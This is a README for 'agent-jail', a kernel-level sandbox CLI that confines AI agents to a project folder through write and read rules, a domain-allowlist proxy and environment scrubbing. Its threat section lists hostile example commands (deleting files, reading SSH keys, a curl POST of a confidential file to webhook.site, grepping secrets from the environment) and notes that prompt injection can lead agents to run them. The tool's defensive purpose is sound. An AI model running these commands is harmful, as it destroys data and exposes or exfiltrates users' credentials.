# 🔒 agent-jail (`aj`)

> **Kernel-enforced OS sandboxing for autonomous AI agents — with zero overhead.**  
> One universal YAML policy (`aj-conf.yaml`) to confine any agent harness (`claude`, `codex`, `gemini`, `pi`, `aider`) or custom Python loop (LangChain, DeepAgents, Agno, CrewAI) strictly to your project folder with sub-millisecond startup.

[![PyPI version](https://img.shields.io/pypi/v/agent-jail-cli.svg)](https://pypi.org/project/agent-jail-cli/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![Overhead: <1ms](https://img.shields.io/badge/overhead-%3C1ms-success.svg)](#how-it-works-the-4-defense-perimeters)

---

## The Reality of Running Agents Locally

If you build or run autonomous agents, you give LLMs a bash tool or a Python interpreter that accepts arbitrary `os` operations. One hallucinated command, buggy path resolution, or prompt injection is all it takes:

* 💥 **File destruction:** `rm -rf ../` or wiping code outside the active repository.
* 🔑 **Credential snooping:** `cat ~/.ssh/id_ed25519` reading private keys and host tokens.
* 📡 **Silent exfiltration:** `curl -X POST https://webhook.site/leak -d @confidential.json` transmitting local data outbound.
* 🕵️ **Environment leakage:** `env | grep -i secret` harvesting host tokens (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, active `SSH_AUTH_SOCK`) into LLM context.

`agent-jail` enforces boundaries directly at the OS kernel level (**Apple Seatbelt** on macOS, **Bubblewrap** on Linux). It starts in **under 1ms**, runs without heavy daemons or virtual machines, and preserves your native terminal workflow.

---

## Quick Start

### 1. Install via `uv`

Install once globally (works on macOS and Ubuntu/Debian):

```bash
# Install from PyPI (recommended)
uv tool install agent-jail-cli

# Or run ephemerally without installing
uvx --from agent-jail-cli aj

# Update to latest version
uv tool upgrade agent-jail-cli

# Or install directly from GitHub / local checkout
uv tool install git+https://github.com/szetaa/agent-jail.git
uv tool install --force .
```

*Registers both `agent-jail` and the shortcut `aj` in your `$PATH`.*

### 2. Prefix Your Agent

Prefix any command or script with `aj`:

```bash
aj pi                          # Run your Pi agent
aj python run_agent.py         # Run your LangChain / DeepAgents / Agno / CrewAI loop
aj bash                        # Drop into a sandboxed interactive shell
aj                             # Default: launches sandboxed shell
```

> **Pro-tip:** Add an alias to your `~/.zshrc` or `~/.bashrc`:
> ```bash
> alias pi="aj pi"
> ```

---

## How It Works: The 4 Defense Perimeters

```
                            HOST MACHINE
  ┌───────────────────────────────────────────────────────────────┐
  │  Host Services:                                               │
  │  - Allowed Localhost Ports (e.g. Ollama 11434, llama.cpp 8080)│
  │  - Dynamic Forward Proxy (127.0.0.1:<random_port>)            │
  └──────────────────────────────▲────────────────────────────────┘
                                 │ HTTP_PROXY (Allowed Domains only)
  ═══════════════════════════════╪═════════════════════════════════
                      KERNEL SANDBOX BOUNDARY
  ═══════════════════════════════╪═════════════════════════════════
  ┌──────────────────────────────┴────────────────────────────────┐
  │  Jailed Process: `aj <command>`                               │
  │                                                               │
  │  1. WRITES: Universal Default-Deny                            │
  │     - Only configured paths (default: $PROJECT) and private   │
  │       ephemeral $TMPDIR writable.                             │
  │     - /Users, /Volumes, /etc, ~/.ssh are strictly locked.     │
  │     - Project can be made fully read-only via `write: []`.    │
  │                                                               │
  │  2. PERSISTENCE DEFENSE:                                      │
  │     - .git/hooks, .git/config, .envrc, .mcp.json, .vscode,    │
  │       and aj-conf.yaml locked read-only.                      │
  │                                                               │
  │  3. NETWORK CONTAINMENT:                                      │
  │     - Raw outbound network killed by kernel (macOS).          │
  │     - Approved HTTP routes via dynamic proxy (SSRF protected) │
  │     - Configured localhost ports pass directly.               │
  │                                                               │
  │  4. ENVIRONMENT SANITIZATION:                                 │
  │     - Stripped host env (no leaked AWS keys, no SSH sockets). │
  │     - Script-loaded project .env works normally.              │
  └───────────────────────────────────────────────────────────────┘
```

1. **Universal Write Lockdown & Scoped Project Writes (`write:`):**  
   Universal default-deny across the entire machine. By default, writes are permitted inside `$PROJECT` (`write: ["."]`) and an ephemeral `$TMPDIR` deleted on exit. You can restrict writes to specific subfolders (e.g. `write: ["output", ".cache"]`) or make the entire project strictly read-only (`write: []`).
2. **Granular Read Access & Secret Hiding (`read:` and `hide:`):**  
   Outside data (`/Users`, `/Volumes`) is blocked. Inside the project, reads default to full project access (`read: ["."]`), but you can scope reads to specific subfolders (e.g. `read: ["src", ".venv"]`) or explicitly deny read access to sensitive files like secrets (`hide: [".env"]`).
3. **Network Containment & Dynamic Forward Proxy:**  
   Raw outbound internet is blocked by the kernel on macOS (and via proxy environment routing on Linux). Approved HTTP/HTTPS traffic routes through an unjailed local proxy enforcing domain allowlists and SSRF protection (dropping private/loopback/cloud-metadata IPs unless explicitly allowed). Blocked requests appear on `stderr` in real time:
   ```text
   agent-jail [proxy]: 🚫 Blocked CONNECT to malicious-site.com:443 (Domain not in allowlist)
   ```
4. **Environment Scrubbing & Anti-Tampering:**  
   Host credentials (`AWS_*`, `GITHUB_*`, `SSH_AUTH_SOCK`) are stripped before launch. Developer persistence vectors (`.git/hooks`, `.git/config`, `.envrc`, `.mcp.json`, `.vscode`, `aj-conf.yaml`) are locked **read-only** so agents cannot stage delayed escapes.

---

## Configuration (`aj-conf.yaml`)

`agent-jail` automatically generates an `aj-conf.yaml` file in your project folder on first run (or manually via `aj --init`).

If you have a global template at `~/.aj/default_conf.yaml`, it will be copied automatically!

```yaml
# aj-conf.yaml

network:
  # Outbound domains, wildcards (*.domain.com), or specific host:port endpoints
  allowed_domains:
    - github.com
    - "*.github.com"
    - githubusercontent.com
    - "*.githubusercontent.com"
    - pypi.org
    - "*.pypi.org"
    - pythonhosted.org
    - "*.pythonhosted.org"
    - huggingface.co
    - "*.huggingface.co"
    - registry.npmjs.org
    # Cloud LLM APIs (uncomment as needed):
    # - api.openai.com
    # - api.anthropic.com
    # - generativelanguage.googleapis.com
    # - openrouter.ai
    # Local LLM servers (standard ports):
    # - 127.0.0.1:11434  # Ollama
    # - 127.0.0.1:8080   # llama.cpp (llama-server)
    # - 127.0.0.1:4000   # LiteLLM Proxy
    # - 127.0.0.1:1234   # LM Studio
    # - 127.0.0.1:8000   # vLLM / Local FastAPI

filesystem:
  # Directories permitted for read access.
  # Default: ["."] grants read access to the entire project directory.
  # Restrict to specific subfolders (e.g. ["src", ".venv"]) for granular reads.
  read:
    - .

  # Specific files or directories to hide completely (deny read).
  # Useful when read: ["."] is enabled but you want to protect secrets like .env.
  hide:
    # - .env
    # - secrets

  # Directories permitted for write access.
  # Default: ["."] grants write access to the project directory.
  # Restrict to specific subfolders (e.g. ["output", ".cache"]) for granular access,
  # or leave empty ([]) to make the entire project strictly read-only.
  write:
    - .

env:
  # Host environment variables to pass into the sandbox
  passthrough:
    # - OPENAI_API_KEY
    # - ANTHROPIC_API_KEY
    # - GEMINI_API_KEY
```

---

## Platform Prerequisites

* **macOS:** Zero installation needed. Uses Apple's built-in `sandbox-exec` (Seatbelt).
* **Linux (Ubuntu / Debian / Fedora / Arch):** Requires unprivileged Bubblewrap:
  ```bash
  sudo apt-get install bubblewrap   # Ubuntu / Debian
  sudo dnf install bubblewrap       # Fedora
  sudo pacman -S bubblewrap         # Arch
  ```

---

## Development, Testing & Publishing

### Local Testing

```bash
# Run the test suite with uv (runs in ~30ms)
uv run --with pytest pytest -v

# Build wheels locally
uv build

# Test changes locally in your global environment before pushing
uv tool install --force .
```

### Publishing a New Version (Git Release)

`agent-jail` is distributed directly via Git:

```bash
# 1. Commit and push on ongoing
git add -A
git commit -m "feat: description (v0.x.x)"
git push origin ongoing

# 2. Merge into main and push (publishes release)
git checkout main
git merge ongoing
git push origin main
git checkout ongoing

# 3. Update your local machine
uv tool upgrade agent-jail-cli
```

---

## License

[MIT](LICENSE)